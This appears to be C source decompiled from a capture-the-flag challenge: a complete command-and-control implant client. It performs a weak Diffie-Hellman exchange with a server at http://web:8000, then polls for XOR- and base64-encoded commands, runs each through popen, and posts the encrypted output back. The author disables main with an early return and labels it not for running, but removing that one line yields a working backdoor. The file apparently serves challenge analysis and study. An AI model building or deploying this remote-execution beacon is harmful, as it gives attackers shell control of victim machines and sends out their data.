// Decompiled from: https://library.m0unt41n.ch/challenges/the-office
// Requires: libcurl-devel cjson-devel openssl-devel
// Builds with: gcc -o/dev/null -lcurl -lcjson -lssl -lcrypto client.c
// Not intented for running :-)

#include <string.h>
#include <stdio.h>
#include <unistd.h>

#include <curl/curl.h>
#include <cjson/cJSON.h>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <openssl/buffer.h>

char last_cmd[1024];

struct MemoryStruct {
    char *memory;
    size_t size;
};

unsigned int mod_pow(int val, int exp, int mod) {
    unsigned int res = 1;
    while ((exp--) > 0) {
        res = (int)(res * val) % mod;
    }
    return res;
}

int xor_encrypt_decrypt(char *src, int len, char key, char *dest) {
    int result;
    for (int i = 0; ; ++i) {
        result = i;
        if (i >= len)
            break;
        dest[i] = src[i] ^ key;
    }
    return result;
}

int calcDecodeLength(char *str) {
    int len = strlen(str);
    int pad = 0;
    if (str[len-1]=='=' && str[len-2]=='=') {
        pad = 2;
    } else if (str[len-1]=='=') {
        pad = 1;
    }
    return (unsigned int)(int)(0.75 * (double)len - (double)pad);
}

char *base64_encode(char *data) {
    BIO *bio_b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(bio_b64, BIO_FLAGS_BASE64_NO_NL);
    bio_b64 = BIO_push(bio_b64, BIO_new(BIO_s_mem()));
  
    BUF_MEM *buf;
    BIO_write(bio_b64, data, strlen(data));
    BIO_ctrl(bio_b64, BIO_CTRL_FLUSH, 0, 0);
    BIO_ctrl(bio_b64, BIO_C_GET_BUF_MEM_PTR, 0, &buf);
    BIO_ctrl(bio_b64, BIO_CTRL_SET_CLOSE, 0, 0);
    BIO_free_all(bio_b64);

    char *result = (char*)malloc(buf->length+1);
    memcpy(result, buf->data, buf->length);
    result[buf->length] = 0;
    return result;
}

char *base64_decode(char *input) {
    int len = calcDecodeLength(input);
    char *result = (char*)malloc(len+1);
    memset(result, 0, len+1);
  
    BIO *bio_b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(bio_b64, BIO_FLAGS_BASE64_NO_NL);
    bio_b64 = BIO_push(bio_b64, BIO_new_mem_buf(input, -1));

    result[BIO_read(bio_b64, result, strlen(input))] = 0;
    BIO_free_all(bio_b64);
    return result;
}

char *execute_command(char *cmd) {
    char *result;
    char *buf = NULL;
    int output_len = 0;
    int len = 0;
    FILE *stream = popen(cmd, "r");
    if (stream) {
        while (!feof(stream)) {
            if (output_len >= len) {
                len += 1024;
                buf = (char*)realloc(buf, len);
            }
            output_len += fread(&buf[output_len], 1, len-output_len, stream);
        }
        pclose(stream);
        result = (char*)realloc(buf, output_len + 1);
        result[output_len] = 0;
    } else {
        fwrite("Failed to run command\n", 1, 22, stderr);
        return 0;
    }
    return result;
}

int WriteMemoryCallback(void *src, int item_size, int item_count, struct MemoryStruct *dest) {
  int len = item_count * item_size;
  char *buf = (char*)realloc(dest->memory, dest->size+(item_count*item_size)+1);
  if (buf) {
      dest->memory = buf;
      memcpy(&dest->memory[dest->size], src, len);
      dest->size += len;
      dest->memory[dest->size] = 0;
      return len;
  } else {
      puts("Not enough memory (realloc returned NULL)");
      return 0;
  }
}

void send_result(char *command_result, char *client_id, char xor_key) {
    int len = strlen(command_result);
    char *buf = (char*)malloc(len + 1);
    if (buf) {
        xor_encrypt_decrypt(command_result, len, xor_key, buf);
        buf[len] = 0;
        char *data = base64_encode(buf);
        if (data) {
            cJSON *json = cJSON_CreateObject();
            cJSON_AddStringToObject(json, "client_id", client_id);
            cJSON_AddStringToObject(json, "data", data);
            char *json_printed = cJSON_PrintUnformatted(json);
            if (json_printed) {
                CURL *curl = curl_easy_init();
                if (curl) {
                    struct curl_slist *hdr = curl_slist_append(0LL, "Content-Type: application/json");
                    curl_easy_setopt(curl, CURLOPTTYPE_STRINGPOINT | CURLOPT_URL, "http://web:8000/send");
                    curl_easy_setopt(curl, CURLOPTTYPE_OBJECTPOINT | CURLOPT_POSTFIELDS, json_printed);
                    curl_easy_setopt(curl, CURLOPTTYPE_SLISTPOINT | CURLOPT_HTTPHEADER, hdr);
                    int status = curl_easy_perform(curl);
                    if (status) {
                        const char *msg = curl_easy_strerror(status);
                        fprintf(stderr, "curl_easy_perform() failed: %s\n", msg);
                    }
                    curl_slist_free_all(hdr);
                    curl_easy_cleanup(curl);
                } else {
                    fwrite("Failed to initialize CURL\n", 1, 26, stderr);
                }
                free(buf);
                free(data);
                cJSON_Delete(json);
                free(json_printed);
            } else {
                fwrite("Failed to create JSON payload\n", 1, 30, stderr);
                cJSON_Delete(json);
                free(data);
            }
        } else {
            fwrite("Failed to base64 encode the encrypted result\n", 1, 45, stderr);
            free(buf);
        }
    } else {
        fwrite("Memory allocation failed for encrypted result\n", 1, 46, stderr);
    }
}

void recv_and_execute_command(char *client_id, char xor_key) {
    struct MemoryStruct ptr;
    ptr.memory = (char*)malloc(1);
    ptr.size = 0;

    cJSON *json_obj = cJSON_CreateObject();
    cJSON_AddStringToObject(json_obj, "client_id", client_id);
    char *json_printed = cJSON_Print(json_obj);
    if (!json_printed) {
        fwrite("Failed to print json.\n", 1, 22, stderr);
        return;
    }
    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL *curl = curl_easy_init();
    if (curl) {
        struct curl_slist *hdr = curl_slist_append(NULL, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPTTYPE_SLISTPOINT | CURLOPT_HTTPHEADER, hdr);
        curl_easy_setopt(curl, CURLOPTTYPE_STRINGPOINT | CURLOPT_URL, "http://web:8000/recv");
        curl_easy_setopt(curl, CURLOPTTYPE_OBJECTPOINT | CURLOPT_POSTFIELDS, json_printed);
        curl_easy_setopt(curl, CURLOPTTYPE_FUNCTIONPOINT | CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPTTYPE_OBJECTPOINT | CURLOPT_WRITEDATA, &ptr);
    
        CURLcode status = curl_easy_perform(curl);
        if (status) {
            const char *msg = curl_easy_strerror(status);
            fprintf(stderr, "curl_easy_perform() failed: %s\n", msg);
        } else {
            cJSON *json = cJSON_Parse(ptr.memory);
            if (json) {
                cJSON *json_enc_cmd = cJSON_GetObjectItemCaseSensitive(json, "encrypted_command");
                if (cJSON_IsString(json_enc_cmd) && json_enc_cmd->valuestring) {
                    char *enc_cmd = json_enc_cmd->valuestring;
                    char *cmd = base64_decode(enc_cmd);
                    if (cmd && strcmp(cmd, last_cmd)) {
                        int size = strlen(cmd);
                        char *encrypted_buffer = (char*)malloc(size);
                        if (!encrypted_buffer) {
                            fwrite("Memory allocation failed for encrypted buffer\n", 1, 46, stderr);
                            free(cmd);
                            cJSON_Delete(json);
                            free(json_printed);
                            return;
                        }
                        printf("BEFORE DECRYPTION: %s\n", cmd);
                        xor_encrypt_decrypt(cmd, size, xor_key, encrypted_buffer);
                        strncpy(last_cmd, cmd, 1023);
                        last_cmd[1023] = 0;
                        printf("AFTER DECRYPTION: %s\n", encrypted_buffer);
                        char *command_result = execute_command(encrypted_buffer);
                        printf("RESULT: %s\n", command_result);
                        send_result(command_result, client_id, xor_key);
                        free(cmd);
                    }
                } else {
                    puts("Encrypted command not found or is not a string.");
                }
                cJSON_Delete(json);
            } else {
                fwrite("Failed to parse JSON response.\n", 1, 31, stderr);
            }
        }
        curl_slist_free_all(hdr);
        curl_easy_cleanup(curl);
        free(ptr.memory);
    }
    cJSON_Delete(json_obj);
    free(json_printed);
    curl_global_cleanup();
}

void send_keys(int b, char *client_id) {
    char url[32];

    cJSON *json = cJSON_CreateObject();
    cJSON_AddNumberToObject(json, "B", (double)b);
    cJSON_AddStringToObject(json, "client_id", client_id);

    char *str = cJSON_PrintUnformatted(json);
    if (!str) {
        fwrite("Failed to serialize JSON\n", 1, 25, stderr);
        cJSON_Delete(json);
        exit(1);
    }
    CURL *curl = curl_easy_init();
    if (curl) {
        strcpy(url, "http://web:8000/recv_keys");
        struct curl_slist *hdr = curl_slist_append(NULL, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPTTYPE_STRINGPOINT | CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPTTYPE_OBJECTPOINT | CURLOPT_POSTFIELDS, str);
        curl_easy_setopt(curl, CURLOPTTYPE_SLISTPOINT | CURLOPT_HTTPHEADER, hdr);
        CURLcode status = curl_easy_perform(curl);
        if (status) {
            const char *msg = curl_easy_strerror(status);
            fprintf(stderr, "curl_easy_perform() failed: %s\n", msg);
        }
        curl_slist_free_all(hdr);
        curl_easy_cleanup(curl);
    }
    free(str);
    return cJSON_Delete(json);
}

void get_keys(int *key_g, int *key_A, int *key_p, char *client_id) {
    struct MemoryStruct curlResult;
    curlResult.memory = (char*)malloc(1);
    curlResult.size = 0;
    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL *curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPTTYPE_STRINGPOINT | CURLOPT_URL, "http://web:8000/gen_keys");
        curl_easy_setopt(curl, CURLOPTTYPE_FUNCTIONPOINT | CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPTTYPE_OBJECTPOINT | CURLOPT_WRITEDATA, &curlResult);
        CURLcode status = curl_easy_perform(curl);
        if (status) {
            const char *msg = curl_easy_strerror(status);
            fprintf(stderr, "curl_easy_perform() failed: %s\n", msg);
        } else {
            puts(curlResult.memory);
            cJSON *json = cJSON_Parse(curlResult.memory);
            if (json) {
                cJSON *obj_g = cJSON_GetObjectItemCaseSensitive(json, "g");
                cJSON *obj_A = cJSON_GetObjectItemCaseSensitive(json, "A");
                cJSON *obj_p = cJSON_GetObjectItemCaseSensitive(json, "p");
                cJSON *obj_client_id = cJSON_GetObjectItemCaseSensitive(json, "client_id");
                if ( obj_g && obj_A && obj_p && obj_client_id ) {
                    *key_g = obj_g->valueint;
                    *key_A = obj_A->valueint;
                    *key_p = obj_p->valueint;
                    strncpy(client_id, obj_client_id->valuestring, 63);
                }
                cJSON_Delete(json);
            } else {
                fwrite("JSON parsing error\n", 1, 19, stderr);
            }
        }
        curl_easy_cleanup(curl);
        free(curlResult.memory);
    }
    curl_global_cleanup();
}

int main(int argc, const char **argv, const char **envp) {
    char client_id[64];
    int key_p, key_A, key_g;

    return 1; // prevent accidentally starting this.

    sleep(10);
    memset(client_id, 0, 64);
    get_keys(&key_g, &key_A, &key_p, client_id);
    int exp = rand() % key_p;
    int b = mod_pow(key_g, exp, key_p);
    int shared_key = mod_pow(key_A, exp, key_p);
    printf("SHARED KEY: %d\n", shared_key);
    send_keys(b, client_id);
    while (1) {
        recv_and_execute_command(client_id, shared_key);
        sleep(1);
    }
}
